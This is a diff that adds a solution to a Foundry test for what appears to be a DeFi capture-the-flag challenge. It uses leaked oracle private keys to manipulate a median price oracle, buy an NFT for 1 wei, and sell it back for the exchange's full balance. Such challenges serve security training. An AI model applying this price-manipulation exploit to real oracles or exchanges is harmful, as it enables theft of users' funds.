@@ -75,7 +75,49 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Instantiating oracle addresses found in the webservice leak
+        address oracle1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        address oracle2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+
+        uint256 buyingPrice = 1; // 1 wei, can't be 0
+
+        // Setting the median price to 1 wei
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", buyingPrice);
+
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", buyingPrice);
+
+        // Buy an NFT
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: buyingPrice}();
+
+        // Changing the median price back to the balance of the exchange
+        uint256 targetPrice = address(exchange).balance;
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", targetPrice);
+
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", targetPrice);
+
+        // Selling the token
+        vm.prank(player);
+        nft.approve(address(exchange), tokenId);
+
+        vm.prank(player);
+        exchange.sellOne(tokenId);
+
+        // Sending the funds back to the recovery account
+        vm.prank(player);
+        (bool success,) = address(recovery).call{value: (targetPrice - buyingPrice)}("");
+        require(success, "Transfer ETH failed");
+
+        // Changing the median price back to the original price
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
     }
 
     /**
